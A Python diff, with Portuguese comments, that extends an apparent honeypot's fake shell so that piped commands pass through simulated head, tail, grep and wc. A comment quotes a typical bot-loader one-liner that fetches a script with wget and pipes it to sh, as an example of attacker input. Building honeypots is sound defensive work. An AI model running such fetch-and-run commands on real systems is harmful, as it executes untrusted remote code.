@@ -177,9 +177,12 @@ class FakeShell:
         segment = re.sub(r"\s*\d?>>?\s*[^\s>]+", "", segment)
         segment = re.sub(r"\s*<\s*\S+", "", segment)
 
-        # Pipes: só o primeiro comando produz saída (suficiente para enganar scripts automatizados).
-        first = segment.split("|")[0].strip()
+        # Pipes: o primeiro comando produz a saída e os filtros comuns (head, grep...) a transformam.
+        stages = [s.strip() for s in segment.split("|")]
+        first = stages[0]
         output = self._run_command(first) if first else ""
+        for stage in stages[1:]:
+            output = self._pipe_filter(stage, output)
 
         # URLs aparecem em qualquer lugar da linha (ex.: "cd /tmp; wget http://x/bot.sh | sh").
         if not first.split() or first.split()[0] not in ("wget", "curl", "tftp"):
@@ -222,6 +225,42 @@ class FakeShell:
                 return f"-bash: {args[0]}: Permission denied\n"
             return f"-bash: {args[0]}: No such file or directory\n"
         return f"{name}: command not found\n"
+
+    @staticmethod
+    def _pipe_filter(stage, text):
+        """Aplica head/tail/grep/wc à saída do comando anterior; outros comandos consomem a saída."""
+        try:
+            args = shlex.split(stage)
+        except ValueError:
+            args = stage.split()
+        if not args:
+            return text
+        name, args = posixpath.basename(args[0]), args[1:]
+        lines = text.splitlines(keepends=True)
+
+        if name in ("head", "tail"):
+            count = 10
+            for i, arg in enumerate(args):
+                if arg == "-n" and i + 1 < len(args) and args[i + 1].lstrip("-").isdigit():
+                    count = int(args[i + 1].lstrip("-"))
+                elif re.fullmatch(r"-n?\d+", arg):
+                    count = int(arg.lstrip("-n"))
+            return "".join(lines[:count] if name == "head" else lines[-count:] if count else [])
+        if name == "grep":
+            flags = "".join(a[1:] for a in args if a.startswith("-"))
+            patterns = [a for a in args if not a.startswith("-")]
+            if not patterns:
+                return ""
+            pattern = patterns[0].lower() if "i" in flags else patterns[0]
+            keep = [l for l in lines if (pattern in (l.lower() if "i" in flags else l)) != ("v" in flags)]
+            return f"{len(keep)}\n" if "c" in flags else "".join(keep)
+        if name == "wc":
+            if "-l" in args:
+                return f"{len(lines)}\n"
+            return f"{len(lines):>7} {len(text.split()):>7} {len(text):>7}\n"
+        if name in ("sort", "uniq", "cat", "tee", "base64", "tr", "awk", "sed", "cut"):
+            return text
+        return ""  # sh, bash, python... "executam" a entrada sem mostrar nada
 
     def _resolve(self, path):
         path = path.replace("~", self.home, 1) if path.startswith("~") else path
